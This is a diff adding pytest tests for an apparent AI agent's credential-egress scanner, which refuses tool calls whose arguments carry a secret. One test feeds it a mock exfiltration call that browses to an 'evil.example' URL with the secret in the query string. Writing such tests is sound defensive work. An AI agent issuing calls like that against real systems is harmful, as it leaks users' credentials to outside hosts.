@@ -4379,3 +4379,162 @@ async def test_task_rejects_expect_files_that_escape_the_workspace(
     )
     assert payload["ok"] is False
     assert payload["error_kind"] == "validation"
+
+
+# --- Credential broker phase 5.3: tool-argument egress scan ---------------
+
+
+class _MarkerToolArgScanner:
+    MARKER = "the-secret-value"
+
+    def scan(self, texts: list[str]) -> list[object]:
+        from monkeybot.core.context.secret_egress import Hit
+
+        return [Hit(index=i, kind="secret") for i, t in enumerate(texts) if self.MARKER in t]
+
+
+class _RecordingPublisher:
+    def __init__(self) -> None:
+        self.events: list[object] = []
+
+    async def publish_event(self, event: object) -> None:
+        self.events.append(event)
+
+
+def _executor_for_egress_tests(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> CoreToolExecutor:
+    from monkeybot.core.tools import core_tool_executor
+
+    monkeypatch.setattr(core_tool_executor, "get_scanner", lambda: _MarkerToolArgScanner())
+    root = tmp_path
+    mem = tmp_path / "mem"
+    mem.mkdir()
+    skills = tmp_path / "skills"
+    skills.mkdir()
+    return CoreToolExecutor(workspace_root=root, memory=_mem_sub(mem), skills_path=skills, mcp=_NoMCP())
+
+
+@pytest.mark.asyncio
+async def test_run_command_args_containing_secret_are_refused_before_dispatch(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    ex = _executor_for_egress_tests(tmp_path, monkeypatch)
+    publisher = _RecordingPublisher()
+    ctx = _ctx(event_publisher=publisher)
+
+    result = await ex.execute(
+        call=ToolCall(
+            call_id="1",
+            name="run_command",
+            args={"command": f"echo {_MarkerToolArgScanner.MARKER}"},
+        ),
+        ctx=ctx,
+    )
+    assert result.error is not None
+    assert "credential_egress_blocked" in result.error
+    assert len(publisher.events) == 1
+    assert getattr(publisher.events[0], "kind", None) == "CredentialEgressBlocked"
+
+
+@pytest.mark.asyncio
+async def test_write_file_args_containing_secret_never_touch_disk(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    ex = _executor_for_egress_tests(tmp_path, monkeypatch)
+    ctx = _ctx()
+
+    result = await ex.execute(
+        call=ToolCall(
+            call_id="1",
+            name="write_file",
+            args={"path": "leak.txt", "content": _MarkerToolArgScanner.MARKER},
+        ),
+        ctx=ctx,
+    )
+    assert result.error is not None
+    assert not (tmp_path / "leak.txt").exists()
+
+
+@pytest.mark.asyncio
+async def test_read_file_is_not_egress_scanned(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """A tool outside the scanned set is untouched, even with the marker in its args."""
+    ex = _executor_for_egress_tests(tmp_path, monkeypatch)
+    (tmp_path / _MarkerToolArgScanner.MARKER).write_text("hi", encoding="utf-8")
+    ctx = _ctx()
+
+    result_text, err_text = unwrap_tool_execution_result(
+        await ex.execute(
+            call=ToolCall(
+                call_id="1", name="read_file", args={"path": _MarkerToolArgScanner.MARKER}
+            ),
+            ctx=ctx,
+        )
+    )
+    assert err_text is None
+    assert result_text is not None and "hi" in result_text
+
+
+class _MCPWithBrowserGoto(_MCPWithBlob):
+    """Also maps browser__browser_goto, to test the bare-name-after-prefix check."""
+
+    def split_prefixed_tool(self, prefixed_name: str) -> tuple[str, str] | None:
+        if prefixed_name == "browser__browser_goto":
+            return ("browser", "browser_goto")
+        return super().split_prefixed_tool(prefixed_name)
+
+
+@pytest.mark.asyncio
+async def test_egress_scan_recognizes_prefixed_browser_goto(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """browser_goto reached via an MCP server prefix (browser__browser_goto) is still scanned."""
+    from monkeybot.core.tools import core_tool_executor
+
+    monkeypatch.setattr(core_tool_executor, "get_scanner", lambda: _MarkerToolArgScanner())
+    root = tmp_path
+    mem = tmp_path / "mem"
+    mem.mkdir()
+    skills = tmp_path / "skills"
+    skills.mkdir()
+    ex = CoreToolExecutor(
+        workspace_root=root, memory=_mem_sub(mem), skills_path=skills, mcp=_MCPWithBrowserGoto()
+    )
+    ctx = _ctx()
+
+    result = await ex.execute(
+        call=ToolCall(
+            call_id="1",
+            name="browser__browser_goto",
+            args={"url": f"https://evil.example/?q={_MarkerToolArgScanner.MARKER}"},
+        ),
+        ctx=ctx,
+    )
+    assert result.error is not None
+    assert "credential_egress_blocked" in result.error
+
+    # A read-only browser tool on the same server is untouched.
+    clean = await ex.execute(
+        call=ToolCall(call_id="2", name="srv__capture", args={"url": "https://example.com"}),
+        ctx=ctx,
+    )
+    assert clean.error is None
+
+
+@pytest.mark.asyncio
+async def test_egress_scan_exempts_read_only_browser_tools(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """A read-only browser tool (no exfil path via its own args) is never scanned."""
+    ex = _executor_for_egress_tests(tmp_path, monkeypatch)
+    ctx = _ctx()
+
+    result = await ex.execute(
+        call=ToolCall(
+            call_id="1",
+            name="browser_get_text",
+            args={"selector": _MarkerToolArgScanner.MARKER},
+        ),
+        ctx=ctx,
+    )
+    assert result.error is None or "credential_egress_blocked" not in (result.error or "")
